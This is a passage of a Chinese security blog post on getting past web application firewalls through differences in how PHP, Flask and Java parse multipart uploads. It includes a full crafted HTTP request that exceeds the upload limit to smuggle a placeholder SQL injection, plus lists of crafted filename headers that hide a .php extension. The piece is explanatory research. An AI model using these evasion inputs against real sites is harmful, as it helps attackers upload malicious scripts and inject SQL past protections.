        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041713226.png-water_print" /></p>
<h2 id="bypass-思路---高级">Bypass 思路 - 高级</h2>
<p>此章节通过结合 PHP 源码来讨论 WAF Bypass 的可能性。</p>
<h3 id="skip_upload---1">skip_upload - 1</h3>
<p>在 PHP <a href="https://github.com/php/php-src/blob/PHP-7.4.28/main/rfc1867.c#L943" target="_blank" rel="noopener noreffer">源码</a>中，处理 multipart 时存在这样一段代码：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051556856.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051556856.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051556856.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051556856.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051556856.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051556856.png-water_print" /></p>
<p>其中的 param 就是 <code>name=&quot;f&quot;</code>，当程序进入 <code>c &lt; 0 </code> 这个分支时，就会跳过当前 part 的上传流程。由于初始化时 <code>c = 0</code>，遇到 <code>[</code> 时，<code>c += 1</code>，遇到 <code>] </code> 时，<code>c -= 1</code>。因此，可以构造 <code>name=&quot;f]&quot;</code>，即可让 <code>c = -1</code>。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051601257.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051601257.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051601257.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051601257.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051601257.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051601257.png-water_print" /></p>
<h3 id="skip_upload---2">skip_upload - 2</h3>
<p>在 PHP <a href="https://github.com/php/php-src/blob/PHP-7.4.28/main/rfc1867.c#L943" target="_blank" rel="noopener noreffer">源码</a>中，有这样一段代码：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051608783.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051608783.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051608783.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051608783.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051608783.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051608783.png-water_print" /></p>
<p>当文件上传数量超出最大值后，会跳过当前 part 文件的处理。在 php 5.2.12 和以上的版本，有一个隐藏的文件上传限制是在 <code>php.ini</code> 里没有的，就是这个 <code>max_file_uploads</code> 的设定，该默认值是 20, 在 php 5.2.17 的版本中该值已不再隐藏。文 件上传限制最大默认设为 20，所以一次上传最大就是 20 个文档，所以超出 20 个就会报错。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/waf.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost:8081</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=a</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">2030</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;1&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;2&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;3&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;4&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;5&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;6&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;7&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;8&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;9&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;10&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;11&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;12&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;13&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;14&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;15&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;16&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;17&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;18&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;19&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;id&#34;; filename=&#34;pic.png&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3
</span></span><span class="line"><span class="cl">--a
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;id&#34;;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sql injection!!!!
</span></span><span class="line"><span class="cl">--a--
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051615512.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051615512.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051615512.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051615512.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051615512.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203051615512.png-water_print" /></p>
<h2 id="关于文件扩展名的绕过">关于文件扩展名的绕过</h2>
<p>前文主要是提出一些关于源站与 WAF 在解析 multipart 之间存在的差异导致的绕过。在实际渗透测试中，如何绕过文件扩展名是很重要一个点，所以本节内容主要介绍，在 WAF 解析到 filename 参数的情况下，从协议和后端解析的层面如何绕过文件扩展名。</p>
<p>整体上的思路为：<code>filename=&quot;file_name.php&quot;</code>，对于 WAF 层面来说，发现扩展名为 php，接着进行拦截，绕过的目标为，使 WAF 解析出的 filename 不出现 php 关键字，并且后端程序在验证扩展名的时候会认为这是一个 php 文件。</p>
<p>从各种程序解析的代码来看，为了让 waf 解析出现问题，干扰的字符除了上文说的引号，空格，转义符，还有 <code>:;</code>，这里还是要分为两种形式的测试。</p>
<ul>
<li>无引号包裹的形式</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name=key3; filename=file_name:.php 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=key3; filename=file_name&#39;.php 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=key3; filename=file_name&#34;.php 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=key3; filename=file_name\&#34;.php 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=key3; filename=file_name .php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=key3; filename=file_name;.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>前五种情况 flask/Java 解析结果都是一致的，会取整体作为 filename 的值，都是含有 php 关键字的，这也说明如果 waf 解析存在差异，将特殊字符直接截断取值，会导致 waf 被绕过。</p>
<p>最后一种情况，flask/Java/php 解析都会直接截断，filename=file_name，这样后端获取不了，无论 waf 解析方式如何，无法绕过。</p>
<p>对于 php 而言，前三种会如 flask 以一样，将整体作为 filename 的值，第五种空格类型，php 会截断，最终取 <code>filename=file_name</code>，这种容易理解，当没出现引号时，出现空格，即认为参数值结束。</p>
<p>然后再测试转义符号的时候，出现了从 <code>\</code> 开始截断，并去 <code>\</code> 后面的值最为 filename的值，这种解析方式和 boundary 解析也不相同，且双引号和单引号相同效果。实际上 php 并没有把 <code>\</code> 当作转义符号，而是将 filename 参数看当做文件路径，并取出 path 里面文件名的部分。所以这个解析方式和引号跟本没关系，只是 php 在解析 filename 时，会取最后的 <code>\</code> 或者 <code>/</code> 后面的值作为文件名。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061018110.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061018110.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061018110.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061018110.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061018110.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061018110.png-water_print" /></p>
<ul>
<li>有引号包裹的形式</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name=f; filename=&#34;file_name:.php&#34; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=f; filename=&#34;file_name&#39;.php&#34; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=f; filename=&#34;file_name&#34;.php&#34; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=f; filename=&#34;file_name\&#34;.php&#34; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=f; filename=&#34;file_name .php&#34; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=f; filename=&#34;file_name;.php&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>flask 解析结果除第三种 filename 取 file_name 之外，其它都会取双引号内整体的值作为 filename，转义符具有转义作用。php 第三种也会解析出 file_name，但是在第四种转义符是具有转义作用的。使用单引号的情况和上文引号部分分析一致。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061025173.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061025173.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061025173.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061025173.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061025173.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203061025173.png-water_print" /></p>
<p>对于 Java 来说，除第三种情况外，都是会取引号内整体作为 filename 值，但是第三种情况 Java 会继续取值，那么最后 filename 为 <code>file_name&quot;.php</code>。所以对于 Java 这个异常的特性来说，通常 WAF 会像 php/flask 那样在第一次出现闭合双引号时，直接取双引号内内容作为 filename 的取值，这样就可以绕过文件扩展名的检测。</p>
<h2 id="参考">参考</h2>
<ul>
<li>
<p>do9gy - <a href="https://t.zsxq.com/UfAEeY3" target="_blank" rel="noopener noreffer">腾讯 WAF 挑战回忆录</a></p>
</li>
<li>
<p>donky16 - <a href="https://t.zsxq.com/fMBM7qz" target="_blank" rel="noopener noreffer">从 RFC 看如何通过 multipart 文件上传绕过 WAF</a></p>
</li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2022-03-05</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/2022/03/waf-bypass/" data-title="WAF Bypass"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://localhost:1313/2022/03/waf-bypass/" data-title="WAF Bypass"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="http://localhost:1313/2022/03/waf-bypass/" data-title="WAF Bypass"><i class="fab fa-skype fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/" class="prev" rel="prev" title="静态程序分析系列(二)"><i class="fas fa-angle-left fa-fw"></i>静态程序分析系列(二)</a>
            <a href="/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/" class="next" rel="next" title="对象存储攻防案例">对象存储攻防案例<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
